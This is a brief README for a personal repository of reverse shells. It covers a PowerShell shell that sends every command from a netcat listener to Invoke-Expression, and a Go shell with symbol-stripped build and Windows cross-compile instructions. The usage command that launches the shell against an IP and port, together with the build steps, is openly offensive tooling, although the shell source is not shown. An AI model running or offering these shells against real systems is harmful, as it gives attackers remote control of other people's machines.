# My Reverse Shells

# Powershell
Native PowerShell reverse shell to a netcat listener.

Supports commands up to 16384 bytes in length, if you need longer than modify the line where the System.Byte[] object is declared.

This passes all commands entered from the netcat listener to PowerShell's Invoke-Expression, so this supports powershell + cmd.exe commands. Errors are sent over the socket

Usage:

<code>./pwsh_revshell.ps1

pwsh_revshell -ip 127.0.0.1 -port 3333</code>

# Golang

Golang reverse shell. Change /bin/bash string to powershell,cmd,/bin/sh, or whatever shell for whatever OS you need.
To Compile:

Linux:
<code>go build  -ldflags="-s -w" -o revshell revshell.go</code>

Cross compile on Linux for Windows:
<code>GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" -o revshell.exe revshell.go</code>
